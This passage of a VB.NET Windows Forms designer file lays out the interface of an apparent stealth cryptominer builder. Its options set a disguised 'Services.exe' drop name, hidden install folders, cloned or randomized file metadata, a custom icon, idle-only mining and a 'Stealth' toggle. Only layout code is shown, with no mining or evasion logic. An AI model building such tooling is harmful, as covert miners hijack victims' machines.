        Me.chkInstall.Margin = New System.Windows.Forms.Padding(2)
        Me.chkInstall.Name = "chkInstall"
        Me.chkInstall.Size = New System.Drawing.Size(111, 24)
        Me.chkInstall.TabIndex = 21
        Me.chkInstall.Text = "Disabled"
        '
        'txtInstallFileName
        '
        Me.txtInstallFileName.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtInstallFileName.Enabled = False
        Me.txtInstallFileName.ForeColor = System.Drawing.Color.Silver
        Me.txtInstallFileName.Location = New System.Drawing.Point(80, 77)
        Me.txtInstallFileName.Margin = New System.Windows.Forms.Padding(2)
        Me.txtInstallFileName.MaxLength = 32767
        Me.txtInstallFileName.MultiLine = False
        Me.txtInstallFileName.Name = "txtInstallFileName"
        Me.txtInstallFileName.Size = New System.Drawing.Size(127, 24)
        Me.txtInstallFileName.TabIndex = 8
        Me.txtInstallFileName.Text = "Services.exe"
        Me.txtInstallFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtInstallFileName.UseSystemPasswordChar = False
        Me.txtInstallFileName.WordWrap = False
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(8, 45)
        Me.Label2.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(61, 15)
        Me.Label2.TabIndex = 19
        Me.Label2.Text = "Save Path:"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(8, 78)
        Me.Label1.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(58, 15)
        Me.Label1.TabIndex = 9
        Me.Label1.Text = "Filename:"
        '
        'txtInstallPathMain
        '
        Me.txtInstallPathMain.BackColor = System.Drawing.Color.Transparent
        Me.txtInstallPathMain.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtInstallPathMain.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInstallPathMain.Enabled = False
        Me.txtInstallPathMain.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.txtInstallPathMain.ForeColor = System.Drawing.Color.Silver
        Me.txtInstallPathMain.FormattingEnabled = True
        Me.txtInstallPathMain.ItemHeight = 16
        Me.txtInstallPathMain.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.txtInstallPathMain.Items.AddRange(New Object() {"Temp", "AppData", "UserProfile"})
        Me.txtInstallPathMain.Location = New System.Drawing.Point(80, 44)
        Me.txtInstallPathMain.Margin = New System.Windows.Forms.Padding(2)
        Me.txtInstallPathMain.Name = "txtInstallPathMain"
        Me.txtInstallPathMain.Size = New System.Drawing.Size(127, 22)
        Me.txtInstallPathMain.StartIndex = 0
        Me.txtInstallPathMain.TabIndex = 18
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.Label35)
        Me.TabPage3.Controls.Add(Me.Label9)
        Me.TabPage3.Controls.Add(Me.chkAssembly)
        Me.TabPage3.Controls.Add(Me.btn_assemblyRandom)
        Me.TabPage3.Controls.Add(Me.txtTitle)
        Me.TabPage3.Controls.Add(Me.btn_assemblyClone)
        Me.TabPage3.Controls.Add(Me.txtProduct)
        Me.TabPage3.Controls.Add(Me.num_Assembly4)
        Me.TabPage3.Controls.Add(Me.txtDescription)
        Me.TabPage3.Controls.Add(Me.num_Assembly3)
        Me.TabPage3.Controls.Add(Me.txtCopyright)
        Me.TabPage3.Controls.Add(Me.num_Assembly2)
        Me.TabPage3.Controls.Add(Me.txtCompany)
        Me.TabPage3.Controls.Add(Me.num_Assembly1)
        Me.TabPage3.Controls.Add(Me.txtTrademark)
        Me.TabPage3.Location = New System.Drawing.Point(89, 4)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(418, 189)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Assembly"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(11, 160)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(48, 15)
        Me.Label9.TabIndex = 22
        Me.Label9.Text = "Version:"
        '
        'chkAssembly
        '
        Me.chkAssembly.AccentColor = System.Drawing.Color.ForestGreen
        Me.chkAssembly.BackColor = System.Drawing.Color.Transparent
        Me.chkAssembly.Checked = False
        Me.chkAssembly.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkAssembly.ForeColor = System.Drawing.Color.Black
        Me.chkAssembly.Location = New System.Drawing.Point(14, 12)
        Me.chkAssembly.Margin = New System.Windows.Forms.Padding(2)
        Me.chkAssembly.Name = "chkAssembly"
        Me.chkAssembly.Size = New System.Drawing.Size(111, 24)
        Me.chkAssembly.TabIndex = 21
        Me.chkAssembly.Text = "Disabled"
        '
        'btn_assemblyRandom
        '
        Me.btn_assemblyRandom.BackColor = System.Drawing.Color.Transparent
        Me.btn_assemblyRandom.Enabled = False
        Me.btn_assemblyRandom.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btn_assemblyRandom.Location = New System.Drawing.Point(324, 156)
        Me.btn_assemblyRandom.Margin = New System.Windows.Forms.Padding(2)
        Me.btn_assemblyRandom.Name = "btn_assemblyRandom"
        Me.btn_assemblyRandom.Size = New System.Drawing.Size(81, 25)
        Me.btn_assemblyRandom.TabIndex = 5
        Me.btn_assemblyRandom.Text = "Randomize"
        '
        'txtTitle
        '
        Me.txtTitle.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtTitle.Enabled = False
        Me.txtTitle.ForeColor = System.Drawing.Color.Silver
        Me.txtTitle.Location = New System.Drawing.Point(14, 47)
        Me.txtTitle.Margin = New System.Windows.Forms.Padding(2)
        Me.txtTitle.MaxLength = 32767
        Me.txtTitle.MultiLine = False
        Me.txtTitle.Name = "txtTitle"
        Me.txtTitle.Size = New System.Drawing.Size(176, 24)
        Me.txtTitle.TabIndex = 0
        Me.txtTitle.Text = "Title..."
        Me.txtTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtTitle.UseSystemPasswordChar = False
        Me.txtTitle.WordWrap = False
        '
        'btn_assemblyClone
        '
        Me.btn_assemblyClone.BackColor = System.Drawing.Color.Transparent
        Me.btn_assemblyClone.Enabled = False
        Me.btn_assemblyClone.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btn_assemblyClone.Location = New System.Drawing.Point(230, 156)
        Me.btn_assemblyClone.Margin = New System.Windows.Forms.Padding(2)
        Me.btn_assemblyClone.Name = "btn_assemblyClone"
        Me.btn_assemblyClone.Size = New System.Drawing.Size(80, 25)
        Me.btn_assemblyClone.TabIndex = 6
        Me.btn_assemblyClone.Text = "Clone File"
        '
        'txtProduct
        '
        Me.txtProduct.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtProduct.Enabled = False
        Me.txtProduct.ForeColor = System.Drawing.Color.Silver
        Me.txtProduct.Location = New System.Drawing.Point(230, 47)
        Me.txtProduct.Margin = New System.Windows.Forms.Padding(2)
        Me.txtProduct.MaxLength = 32767
        Me.txtProduct.MultiLine = False
        Me.txtProduct.Name = "txtProduct"
        Me.txtProduct.Size = New System.Drawing.Size(176, 24)
        Me.txtProduct.TabIndex = 0
        Me.txtProduct.Text = "Product..."
        Me.txtProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtProduct.UseSystemPasswordChar = False
        Me.txtProduct.WordWrap = False
        '
        'num_Assembly4
        '
        Me.num_Assembly4.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly4.Enabled = False
        Me.num_Assembly4.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly4.Location = New System.Drawing.Point(167, 157)
        Me.num_Assembly4.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly4.MaxLength = 32767
        Me.num_Assembly4.MultiLine = False
        Me.num_Assembly4.Name = "num_Assembly4"
        Me.num_Assembly4.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly4.TabIndex = 1
        Me.num_Assembly4.Text = "0"
        Me.num_Assembly4.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly4.UseSystemPasswordChar = False
        Me.num_Assembly4.WordWrap = False
        '
        'txtDescription
        '
        Me.txtDescription.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtDescription.Enabled = False
        Me.txtDescription.ForeColor = System.Drawing.Color.Silver
        Me.txtDescription.Location = New System.Drawing.Point(14, 83)
        Me.txtDescription.Margin = New System.Windows.Forms.Padding(2)
        Me.txtDescription.MaxLength = 32767
        Me.txtDescription.MultiLine = False
        Me.txtDescription.Name = "txtDescription"
        Me.txtDescription.Size = New System.Drawing.Size(176, 24)
        Me.txtDescription.TabIndex = 0
        Me.txtDescription.Text = "Description..."
        Me.txtDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtDescription.UseSystemPasswordChar = False
        Me.txtDescription.WordWrap = False
        '
        'num_Assembly3
        '
        Me.num_Assembly3.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly3.Enabled = False
        Me.num_Assembly3.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly3.Location = New System.Drawing.Point(140, 157)
        Me.num_Assembly3.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly3.MaxLength = 32767
        Me.num_Assembly3.MultiLine = False
        Me.num_Assembly3.Name = "num_Assembly3"
        Me.num_Assembly3.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly3.TabIndex = 2
        Me.num_Assembly3.Text = "0"
        Me.num_Assembly3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly3.UseSystemPasswordChar = False
        Me.num_Assembly3.WordWrap = False
        '
        'txtCopyright
        '
        Me.txtCopyright.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtCopyright.Enabled = False
        Me.txtCopyright.ForeColor = System.Drawing.Color.Silver
        Me.txtCopyright.Location = New System.Drawing.Point(230, 83)
        Me.txtCopyright.Margin = New System.Windows.Forms.Padding(2)
        Me.txtCopyright.MaxLength = 32767
        Me.txtCopyright.MultiLine = False
        Me.txtCopyright.Name = "txtCopyright"
        Me.txtCopyright.Size = New System.Drawing.Size(176, 24)
        Me.txtCopyright.TabIndex = 0
        Me.txtCopyright.Text = "Copyright..."
        Me.txtCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtCopyright.UseSystemPasswordChar = False
        Me.txtCopyright.WordWrap = False
        '
        'num_Assembly2
        '
        Me.num_Assembly2.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly2.Enabled = False
        Me.num_Assembly2.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly2.Location = New System.Drawing.Point(113, 157)
        Me.num_Assembly2.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly2.MaxLength = 32767
        Me.num_Assembly2.MultiLine = False
        Me.num_Assembly2.Name = "num_Assembly2"
        Me.num_Assembly2.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly2.TabIndex = 3
        Me.num_Assembly2.Text = "0"
        Me.num_Assembly2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly2.UseSystemPasswordChar = False
        Me.num_Assembly2.WordWrap = False
        '
        'txtCompany
        '
        Me.txtCompany.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtCompany.Enabled = False
        Me.txtCompany.ForeColor = System.Drawing.Color.Silver
        Me.txtCompany.Location = New System.Drawing.Point(14, 119)
        Me.txtCompany.Margin = New System.Windows.Forms.Padding(2)
        Me.txtCompany.MaxLength = 32767
        Me.txtCompany.MultiLine = False
        Me.txtCompany.Name = "txtCompany"
        Me.txtCompany.Size = New System.Drawing.Size(176, 24)
        Me.txtCompany.TabIndex = 0
        Me.txtCompany.Text = "Company..."
        Me.txtCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtCompany.UseSystemPasswordChar = False
        Me.txtCompany.WordWrap = False
        '
        'num_Assembly1
        '
        Me.num_Assembly1.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.num_Assembly1.Enabled = False
        Me.num_Assembly1.ForeColor = System.Drawing.Color.Silver
        Me.num_Assembly1.Location = New System.Drawing.Point(87, 157)
        Me.num_Assembly1.Margin = New System.Windows.Forms.Padding(2)
        Me.num_Assembly1.MaxLength = 32767
        Me.num_Assembly1.MultiLine = False
        Me.num_Assembly1.Name = "num_Assembly1"
        Me.num_Assembly1.Size = New System.Drawing.Size(23, 24)
        Me.num_Assembly1.TabIndex = 4
        Me.num_Assembly1.Text = "0"
        Me.num_Assembly1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly1.UseSystemPasswordChar = False
        Me.num_Assembly1.WordWrap = False
        '
        'txtTrademark
        '
        Me.txtTrademark.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtTrademark.Enabled = False
        Me.txtTrademark.ForeColor = System.Drawing.Color.Silver
        Me.txtTrademark.Location = New System.Drawing.Point(230, 119)
        Me.txtTrademark.Margin = New System.Windows.Forms.Padding(2)
        Me.txtTrademark.MaxLength = 32767
        Me.txtTrademark.MultiLine = False
        Me.txtTrademark.Name = "txtTrademark"
        Me.txtTrademark.Size = New System.Drawing.Size(176, 24)
        Me.txtTrademark.TabIndex = 0
        Me.txtTrademark.Text = "Trademark..."
        Me.txtTrademark.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtTrademark.UseSystemPasswordChar = False
        Me.txtTrademark.WordWrap = False
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage4.Controls.Add(Me.chkIcon)
        Me.TabPage4.Controls.Add(Me.picIcon)
        Me.TabPage4.Controls.Add(Me.btnBrowseIcon)
        Me.TabPage4.Controls.Add(Me.txtIconPath)
        Me.TabPage4.Location = New System.Drawing.Point(89, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Size = New System.Drawing.Size(418, 189)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Icon"
        '
        'chkIcon
        '
        Me.chkIcon.AccentColor = System.Drawing.Color.ForestGreen
        Me.chkIcon.BackColor = System.Drawing.Color.Transparent
        Me.chkIcon.Checked = False
        Me.chkIcon.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkIcon.ForeColor = System.Drawing.Color.Black
        Me.chkIcon.Location = New System.Drawing.Point(14, 12)
        Me.chkIcon.Margin = New System.Windows.Forms.Padding(2)
        Me.chkIcon.Name = "chkIcon"
        Me.chkIcon.Size = New System.Drawing.Size(111, 24)
        Me.chkIcon.TabIndex = 21
        Me.chkIcon.Text = "Disabled"
        '
        'picIcon
        '
        Me.picIcon.ErrorImage = Nothing
        Me.picIcon.Image = CType(resources.GetObject("picIcon.Image"), System.Drawing.Image)
        Me.picIcon.InitialImage = Nothing
        Me.picIcon.Location = New System.Drawing.Point(160, 81)
        Me.picIcon.Margin = New System.Windows.Forms.Padding(2)
        Me.picIcon.Name = "picIcon"
        Me.picIcon.Size = New System.Drawing.Size(96, 96)
        Me.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picIcon.TabIndex = 11
        Me.picIcon.TabStop = False
        '
        'btnBrowseIcon
        '
        Me.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent
        Me.btnBrowseIcon.Enabled = False
        Me.btnBrowseIcon.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btnBrowseIcon.Location = New System.Drawing.Point(14, 48)
        Me.btnBrowseIcon.Margin = New System.Windows.Forms.Padding(2)
        Me.btnBrowseIcon.Name = "btnBrowseIcon"
        Me.btnBrowseIcon.Size = New System.Drawing.Size(69, 25)
        Me.btnBrowseIcon.TabIndex = 9
        Me.btnBrowseIcon.Text = "Browse"
        '
        'txtIconPath
        '
        Me.txtIconPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtIconPath.ForeColor = System.Drawing.Color.Silver
        Me.txtIconPath.Location = New System.Drawing.Point(87, 49)
        Me.txtIconPath.Margin = New System.Windows.Forms.Padding(2)
        Me.txtIconPath.MaxLength = 32767
        Me.txtIconPath.MultiLine = False
        Me.txtIconPath.Name = "txtIconPath"
        Me.txtIconPath.Size = New System.Drawing.Size(302, 24)
        Me.txtIconPath.TabIndex = 10
        Me.txtIconPath.Text = "Path to icon..."
        Me.txtIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtIconPath.UseSystemPasswordChar = False
        Me.txtIconPath.WordWrap = False
        '
        'TabPage6
        '
        Me.TabPage6.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage6.Controls.Add(Me.MephButton1)
        Me.TabPage6.Controls.Add(Me.Label26)
        Me.TabPage6.Controls.Add(Me.Label27)
        Me.TabPage6.Controls.Add(Me.toggleEnableStealth)
        Me.TabPage6.Controls.Add(Me.Label25)
        Me.TabPage6.Controls.Add(Me.Label24)
        Me.TabPage6.Controls.Add(Me.Label23)
        Me.TabPage6.Controls.Add(Me.txtIdleWait)
        Me.TabPage6.Controls.Add(Me.Label21)
        Me.TabPage6.Controls.Add(Me.txtIdleCPU)
        Me.TabPage6.Controls.Add(Me.Label22)
        Me.TabPage6.Controls.Add(Me.Label17)
        Me.TabPage6.Controls.Add(Me.Label18)
        Me.TabPage6.Controls.Add(Me.toggleSSLTLS)
        Me.TabPage6.Controls.Add(Me.Label16)
        Me.TabPage6.Controls.Add(Me.Label15)
        Me.TabPage6.Controls.Add(Me.Label14)
        Me.TabPage6.Controls.Add(Me.helpLabelEnableCPU)
        Me.TabPage6.Controls.Add(Me.helpLabelMaxCPU)
        Me.TabPage6.Controls.Add(Me.Label13)
        Me.TabPage6.Controls.Add(Me.toggleEnableCPU)
        Me.TabPage6.Controls.Add(Me.Label12)
        Me.TabPage6.Controls.Add(Me.toggleEnableNicehash)
        Me.TabPage6.Controls.Add(Me.Label11)
        Me.TabPage6.Controls.Add(Me.toggleEnableIdle)
        Me.TabPage6.Controls.Add(Me.Label4)
        Me.TabPage6.Controls.Add(Me.toggleEnableGPU)
        Me.TabPage6.Controls.Add(Me.txtMaxCPU)
        Me.TabPage6.Controls.Add(Me.Label3)
        Me.TabPage6.Location = New System.Drawing.Point(89, 4)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage6.Size = New System.Drawing.Size(418, 189)
        Me.TabPage6.TabIndex = 5
        Me.TabPage6.Text = "Mining"
        '
        'MephButton1
        '
        Me.MephButton1.BackColor = System.Drawing.Color.Transparent
        Me.MephButton1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.MephButton1.Location = New System.Drawing.Point(267, 160)
        Me.MephButton1.Name = "MephButton1"
        Me.MephButton1.Size = New System.Drawing.Size(145, 23)
        Me.MephButton1.TabIndex = 58
        Me.MephButton1.Text = "Advanced Options"
        '
        'Label27
        '
        Me.Label27.AutoSize = True
        Me.Label27.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label27.Location = New System.Drawing.Point(10, 145)
        Me.Label27.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label27.Name = "Label27"
        Me.Label27.Size = New System.Drawing.Size(50, 17)
        Me.Label27.TabIndex = 56
        Me.Label27.Text = "Stealth:"
        '
        'toggleEnableStealth
        '
        Me.toggleEnableStealth.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableStealth.Checked = False
        Me.toggleEnableStealth.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableStealth.Location = New System.Drawing.Point(124, 144)
        Me.toggleEnableStealth.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableStealth.Name = "toggleEnableStealth"
        Me.toggleEnableStealth.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableStealth.TabIndex = 55
        Me.toggleEnableStealth.Text = "Enable Nicehash Mining"
        '
        'Label24
        '
        Me.Label24.AutoSize = True
        Me.Label24.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label24.Location = New System.Drawing.Point(356, 69)
        Me.Label24.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label24.Name = "Label24"
        Me.Label24.Size = New System.Drawing.Size(54, 17)
        Me.Label24.TabIndex = 53
        Me.Label24.Text = "Minutes"
        '
        'Label23
        '
        Me.Label23.AutoSize = True
        Me.Label23.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label23.Location = New System.Drawing.Point(264, 69)
        Me.Label23.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label23.Name = "Label23"
        Me.Label23.Size = New System.Drawing.Size(61, 17)
        Me.Label23.TabIndex = 52
        Me.Label23.Text = "Idle Wait:"
        '
        'txtIdleWait
        '
        Me.txtIdleWait.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtIdleWait.Enabled = False
        Me.txtIdleWait.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtIdleWait.ForeColor = System.Drawing.Color.Silver
        Me.txtIdleWait.Location = New System.Drawing.Point(330, 67)
        Me.txtIdleWait.MaxLength = 32767
        Me.txtIdleWait.MultiLine = False
        Me.txtIdleWait.Name = "txtIdleWait"
        Me.txtIdleWait.Size = New System.Drawing.Size(24, 24)
        Me.txtIdleWait.TabIndex = 51
        Me.txtIdleWait.Text = "5"
        Me.txtIdleWait.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtIdleWait.UseSystemPasswordChar = False
        Me.txtIdleWait.WordWrap = False
        '
        'txtIdleCPU
        '
        Me.txtIdleCPU.BackColor = System.Drawing.Color.Transparent
        Me.txtIdleCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtIdleCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtIdleCPU.Enabled = False
        Me.txtIdleCPU.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtIdleCPU.ForeColor = System.Drawing.Color.Silver
        Me.txtIdleCPU.FormattingEnabled = True
        Me.txtIdleCPU.ItemHeight = 16
        Me.txtIdleCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.txtIdleCPU.Items.AddRange(New Object() {"0%", "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"})
        Me.txtIdleCPU.Location = New System.Drawing.Point(330, 39)
        Me.txtIdleCPU.Name = "txtIdleCPU"
        Me.txtIdleCPU.Size = New System.Drawing.Size(60, 22)
        Me.txtIdleCPU.StartIndex = 8
        Me.txtIdleCPU.TabIndex = 49
        '
        'Label22
        '
        Me.Label22.AutoSize = True
        Me.Label22.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label22.Location = New System.Drawing.Point(263, 40)
        Me.Label22.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label22.Name = "Label22"
        Me.Label22.Size = New System.Drawing.Size(60, 17)
        Me.Label22.TabIndex = 48
        Me.Label22.Text = "Idle CPU:"
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label18.Location = New System.Drawing.Point(10, 91)
        Me.Label18.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label18.Name = "Label18"
        Me.Label18.Size = New System.Drawing.Size(56, 17)
        Me.Label18.TabIndex = 42
        Me.Label18.Text = "SSL/TLS:"
        '
        'toggleSSLTLS
        '
        Me.toggleSSLTLS.BackColor = System.Drawing.Color.Transparent
        Me.toggleSSLTLS.Checked = False
        Me.toggleSSLTLS.ForeColor = System.Drawing.Color.Black
        Me.toggleSSLTLS.Location = New System.Drawing.Point(123, 90)
        Me.toggleSSLTLS.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleSSLTLS.Name = "toggleSSLTLS"
        Me.toggleSSLTLS.Size = New System.Drawing.Size(50, 24)
        Me.toggleSSLTLS.TabIndex = 41
        Me.toggleSSLTLS.Text = "Enable SSL/TLS Connection"
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label13.Location = New System.Drawing.Point(10, 10)
        Me.Label13.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(79, 17)
        Me.Label13.TabIndex = 34
        Me.Label13.Text = "CPU Mining:"
        '
        'toggleEnableCPU
        '
        Me.toggleEnableCPU.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableCPU.Checked = True
        Me.toggleEnableCPU.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableCPU.Location = New System.Drawing.Point(123, 8)
        Me.toggleEnableCPU.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableCPU.Name = "toggleEnableCPU"
        Me.toggleEnableCPU.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableCPU.TabIndex = 33
        Me.toggleEnableCPU.Text = "Enable CPU Mining"
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label12.Location = New System.Drawing.Point(10, 118)
        Me.Label12.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(108, 17)
        Me.Label12.TabIndex = 32
        Me.Label12.Text = "Nicehash Mining:"
        '
        'toggleEnableNicehash
        '
        Me.toggleEnableNicehash.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableNicehash.Checked = False
        Me.toggleEnableNicehash.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableNicehash.Location = New System.Drawing.Point(124, 117)
        Me.toggleEnableNicehash.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableNicehash.Name = "toggleEnableNicehash"
        Me.toggleEnableNicehash.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableNicehash.TabIndex = 31
        Me.toggleEnableNicehash.Text = "Enable Nicehash Mining"
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label11.Location = New System.Drawing.Point(10, 65)
        Me.Label11.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(76, 17)
        Me.Label11.TabIndex = 30
        Me.Label11.Text = "Idle Mining:"
        '
        'toggleEnableIdle
        '
        Me.toggleEnableIdle.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableIdle.Checked = False
        Me.toggleEnableIdle.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableIdle.Location = New System.Drawing.Point(123, 63)
        Me.toggleEnableIdle.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableIdle.Name = "toggleEnableIdle"
        Me.toggleEnableIdle.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableIdle.TabIndex = 29
        Me.toggleEnableIdle.Text = "Enable Idle Mining"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label4.Location = New System.Drawing.Point(10, 38)
        Me.Label4.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(80, 17)
        Me.Label4.TabIndex = 28
